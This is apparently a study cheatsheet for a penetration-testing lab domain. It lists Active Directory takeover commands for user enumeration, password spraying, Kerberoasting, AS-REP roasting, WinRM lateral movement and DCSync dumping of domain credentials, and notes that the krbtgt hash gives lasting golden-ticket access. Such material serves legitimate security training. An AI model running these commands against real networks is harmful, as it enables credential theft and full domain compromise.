# Cheatsheet — Domain Takeover

## Targets

- **dc01 + dc02** (corp DCs), **ws01 + ws02** (workstations)
- entry: a helpdesk user with a seasonal password — SYSVOL names them

## Useful commands

```bash
# user enum + spray (slow — one password per window)
kerbrute userenum --dc <dc01> -d corp.pentrain.local <users.txt>
netexec smb <dc01> -u <users.txt> -p '<seasonal>' --continue-on-success
smbclient -N //<ws01>/ops -c 'recurse;ls'            # anonymous shares too

# with any domain user:
bloodhound-python -u <user> -p '<pw>' -d corp.pentrain.local -dc <dc01> -c all
impacket-GetUserSPNs 'corp.pentrain.local/<user>:<pw>' -request
impacket-GetNPUsers -no-pass -usersfile <users.txt> corp.pentrain.local/

# lateral + sync
evil-winrm -i <ws01> -u <user> -p '<pass>'
impacket-secretsdump 'corp.pentrain.local/<user>:<pass>@<dc01>' -just-dc
```

## Concepts

- Spray = one password, many users — reverse of brute force, avoids lockout
- DCSync uses the DC's own replication protocol — legit requests, malicious intent
- krbtgt NTLM = golden tickets forever; the domain is owned, not just a box
